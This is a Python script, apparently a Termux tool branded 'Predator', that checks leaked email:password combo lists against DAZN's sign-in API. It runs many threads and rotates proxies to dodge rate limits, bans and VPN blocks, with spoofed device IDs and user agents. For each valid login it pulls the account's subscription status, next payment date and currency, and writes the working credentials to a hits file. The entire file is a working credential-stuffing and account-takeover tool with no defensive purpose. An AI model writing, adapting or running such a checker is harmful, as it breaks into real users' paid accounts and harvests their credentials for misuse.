import re, threading, requests, string, random, time, os, subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from random import randint, randrange

#Messages
limit="Request limiting policy has been breached"
error_pass="InvalidPassword"
vpn="DAZN isn't available via VPN"
ban="Forbidden"
#Config
dev=0
def id_generator(size=8, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
    
def clear():
 subprocess.run(["clear", ""])
 #time.sleep(0.1)
 
def logo():
 predator=("""\33[0m\33[33m╔══════════════════════════════════════    
║___  ____ ____ ___  ____ ___ ____ ____ 
║|__] |__/ |___ |  \ |__|  |  |  | |__/ 
║|    |  \ |___ |__/ |  |  |  |__| |  \     
║                                    
╚════════════════════════════════════       
\33[0m\33[0m\33[0m\33[1;7;100m               ⚙️ ❪❪❪  𝔻𝔸ℤℕ  ❫❫❫ ⚙️          \33[0m\33[1;44m
  ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️ Ⓑⓨ [★ Ꭾr໐คrtix ★]           \33[0m\33[0;1m""")
 subprocess.run(["clear", ""])
 print(predator)
    
say=0
fls=""
dir='/sdcard/Combo/'      	
if not os.path.exists(dir):
 os.mkdir(dir)

logo()
for files in os.listdir (dir):
 say=say+1
 fls=fls+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
print("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ  \33[36m
    	
    """+fls+"""
        	""")
        	
daznfile=int(input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""))

say=0
for files in os.listdir (dir):
 say+=1
 if say==daznfile:
  file=(dir+files)
  break
users=open(file).readlines()
total=len(users)



while True:
 logo()
 print("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ɴᴜᴍʙᴇʀ ʙᴏᴛꜱ\33[36m
    	
    	\33[1;31m*\33[0m \33[36m1 - 100 ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ \33[36m
""")
 break_bot=input("""\33[36m
ʙᴏᴛꜱ = \33[36m\33[36m\33[36m""")
 break_bot=int(break_bot)
 if break_bot<=100:
     break        
     
retry=0
hits=0
scans=0
custom=0
def gui():
 while True:
  global scans, hits, retry, guiprox, custom
  if guiprox==0:
   prox="├🔴  Proxy    ↔️  ➤  OFF"
  else:
   prox="├🔵  Proxy    ↔️  ➤  ON"
  gui=("""
╭➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️ [★ ᴅᴀᴢɴ ★]         
├🔘  Total    📊  ➤  """+str(total)+"""
├🔘  Scans    🕵️‍♂️  ➤  """+str(scans)+"""    
├🟡  Retry    🔄  ➤  """+str(retry)+"""    
"""+prox+"""
├🟢  Hits     🔥  ➤  """+str(hits)+"""    
├⚪  Custom   🕶️  ➤  """+str(custom)+"""    
╰⚫  Bots     🤖  ➤  """+str(break_bot)+"""
""")
  logo()
  print(gui)
  time.sleep(0.5)

selectprox=0
def proxy():    
 global selectprox
 dirp='/sdcard/proxy/'
 say=0    
 for files in os.listdir (dirp):
     say+=1
     if str(proxyfile)==str(say):
         pdosya=(dirp+files)            
         break               
 proxyf=open(pdosya).readlines()
    
 proxys=(proxyf[selectprox])
 proxys=proxys.replace("\n","")   
 return proxys

proxymode=0
logo()
print("""
	\33[1;31m \33[0m\33[1;32mᴜꜱᴇ ᴘʀᴏxʏꜱ?\33[36m
    	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mYes  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mNo \33[36m

""")
proxymode=input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m""")
proxymode=int(proxymode)

typep=0
if proxymode==1:
 logo()
 dirp='/sdcard/proxy/' 
 say=0
 fls=""
 for files in os.listdir (dirp):
  say=say+1
  fls=fls+"	\33[1;31m"+str(say)+"\33[0m\33[1;32m = \33[0m \33[36m"+files+'\33[36m\n'
 print ("""
    	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ  \33[36m
    	
    """+fls+"""
        	""")
 proxyfile=int(input("""\33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""))
 say=0
 for files in os.listdir (dirp):
  say+=1
  if say==proxyfile:
   file=(dirp+files)
   break
 proxyf=open(file).readlines()

 
 logo() 
 typep="""
	\33[1;31m \33[0m\33[1;32mꜱᴇʟᴇᴄᴛ ᴘʀᴏxʏ ᴛʏᴘᴇ  \33[36m
        	
	\33[1;31m1 \33[0m\33[1;32m= \33[0m \33[36mʜᴛᴛᴘ  \33[36m    
	\33[1;31m2 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ4 \33[36m
	\33[1;31m3 \33[0m\33[1;32m= \33[0m \33[36mꜱᴏᴄᴋ5 \33[36m
        
        
    \33[36m
ᴏᴘᴛɪᴏɴ = \33[36m\33[36m\33[36m"""
 typep=typep+"""\33[0m"""
 typep=int(input(typep))
 
  
  
bot=0
id_bot=0
selectprox=0
def run():
 global custom, guiprox, scans, hits, retry, bot, selectprox
 pattern= "(\w{2}:\w{2})"
 bot+=1
 id_bot=bot
 proxys="OFF"
 if proxymode==2:
  badprox=0
  guiprox=0
 else:
  badprox=1
  guiprox=1
 for predator in range(id_bot, total, break_bot):
  up=re.search(pattern,users[predator],re.IGNORECASE)
  #===== SELECT USERS ========
  if up:
   predatorr = users[predator].split(":")    			 
   try:
    user=str(predatorr[0].replace(" ",""))
   except:
    user='user'    			 
   try:
    pas=str(predatorr[1].replace(" ",""))
    pas=str(pas.replace('\n',""))
   except:
    pas='12345' 
  #================================   
  	 
  while True:
   #=====[ PROXY SELECT ]======= 
   if badprox == 1:  	
    if typep == 1 or typep == 2 or typep==3:      
     dirp='/sdcard/proxy/'
     say=0    
     for files in os.listdir (dirp):
      say+=1
      if str(proxyfile)==str(say):
        pdosya=(dirp+files)            
        break               
     proxyf=open(pdosya).readlines()  
    try: 
     proxylen=len(proxyf)
     proxyr=randint(1,proxylen)
     proxys=(proxyf[proxyr])
     proxys=proxys.replace("\n","")
     proxys=proxys.replace("<br />","")
     proxys=proxys.replace("<br/>","")
     badprox=0
    except:pass
   #================================== 
   if typep==1:
    #proxys=proxy()
    proxies = {
   'http': proxys ,
   'https': proxys ,
    }
   if typep==2:
    #proxys=proxy()
    proxies = {
   'http': 'socks4://'+proxys ,
   'https': 'socks4://'+proxys ,
    }   	 
   if typep==3:
    #proxys=proxy()
    proxies = {
   'http': 'socks5://'+proxys ,
   'https': 'socks5://'+proxys ,
    }   	            	   	   	   	
   	#============================
   if dev==1:
    print("""
["""+str(id_bot)+"""] """+user+""":"""+pas+""" 
[Proxy] """+proxys+"""    

""")     
    time.sleep(2) 

#======[ CHECKER ]==========
   api=randint(1,2)   
   if api==1:#IOS
    ids=id_generator(8)+"-"+id_generator(4)+"-"+id_generator(4)+"-"+id_generator(4)+"-"+id_generator(12)       
    try:
     data= {
    	"Platform":"iOS",
    	"Email":user,   	
    	"DeviceId":ids,
    	"Password":pas
   	 }
    except:pass  	
    header={
 	  "Host": "authentication-prod.ar.indazn.com",
    "User-Agent": "DAZN/2.5.6 (iPhone7,2; com.dazn.theApp; 16425; iOS 12.4.3)" ,
    "Accept": "*/*" 
    }    
   if api==2:#WEB
    ids=id_generator(10)
    ids=ids.upper()
    try:
     data= {
    	"Platform":"WEB",
    	"Email":user,
   	 "DeviceId":ids,
    	"Password":pas
   	 }
    except:pass   	 
   	
    header={
 	  "Host": "authentication-prod.ar.indazn.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" ,
    "Accept": "*/*" 
    }  
   if proxymode==2:
    token=requests.post("https://authentication-prod.ar.indazn.com/v5/SignIn", headers=header, json=data, timeout=5).text    
    print(token)
   else:
    try:
     token=requests.post("https://authentication-prod.ar.indazn.com/v5/SignIn", timeout=5, verify=False, headers=header, json=data, proxies=proxies).text
     if dev==1:
      print(token)
    except Exception as e:
     if dev==1:
      print(e)
     retry+=1
     token="bad"     
     badprox = 1
   if ban in token:
    retry+=1
    if proxymode==1:
     badprox=1     
   if limit in token:
    retry+=1
    if proxymode==1:
     badprox=1
   if token=="bad":
    retry+=1
    badprox=1
   if vpn in token:
    retry+=1
    badprox=1    
   if error_pass in token:   
    scans+=1
    break  
   try:           
    token=token.split('Token":"')[1]
    token=token.split('"')[0] 
    header2={
 "Accept": "application/json, text/plain, */*" ,
 "Accept-Encoding": "gzip, deflate, br" ,
 "Accept-Language": "fr-FR,fr;q=0.9" ,
 "Authorization": "Bearer "+token, 
 "onnection": "keep-alive" ,
 "Host": "subscriptions-service.dazn-api.com" ,
 "Origin": "https://www.dazn.com" ,
 "Referer": "https://www.dazn.com/" ,
 "sec-ch-ua": '"Google Chrome";v="93", " Not;A Brand";v="99", "Chromium";v="93"',
 "sec-ch-ua-mobile": "?0" ,
 "sec-ch-ua-platform": "Windows",
 "Sec-Fetch-Dest": "empty" ,
 "Sec-Fetch-Mode": "cors" ,
 "Sec-Fetch-Site": "cross-site" ,
 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36" 
 	}
    data=requests.get('https://subscriptions-service.dazn-api.com/fe/v1/subscriptions', headers=header2, verify=False).text
    status=data.split('status":"')[1]
    status=status.split('"')[0]
    nextp=data.split('nextPaymentDate":"')[1]
    nextp=nextp.split('"')[0]
    current=data.split('currency":"')[1]
    current=current.split('"')[0]
    if status=="Cancelled":
     custom+=1
    else:
     hits+=1    
    scans+=1
    dazn="""
╭──➤ ☢️ 🅿🆁🅴🅳🅰🆃🅾🆁 ☢️
╰────[ 𝓑𝔂 Ꭾr໐คrtix ] [ᴅᴀᴢɴ]

╭──➤ ❪❪ 🔌 🅂🄸🄶🄽 🄸🄽 🔌 ❫❫
├❪🔘❫ 👩‍ User ➤ """+user+"""
├❪🔘❫ 🔑 Pass ➤ """+pas+"""
╰────────⧳
                
╭──➤ ℹ️ 🄸🄽🄵🄾 ℹ️
├❪🔘❫ 🪙 Next Pay ➤ """+nextp+"""
├❪🔘❫ ✅ Status   ➤ """+status+"""
├❪🔘❫ 💲 Money    ➤ """+current+"""
╰────────⧳
                """
    writed=open('/sdcard/Hits/Predator_dazn.txt','a+') 
    writed.write(dazn) 
    writed.close()
    if dev==1:
     print(dazn)
    break    
   except:pass


run_bot=0
while True:
 startrun = threading.Thread(target=run)
 startrun.start()
 run_bot+=1
 #time.sleep(1)
 if run_bot==break_bot:
     break


if dev==1:
 time.sleep(0.1)
else:
 startgui = threading.Thread(target=gui)
 startgui.start()
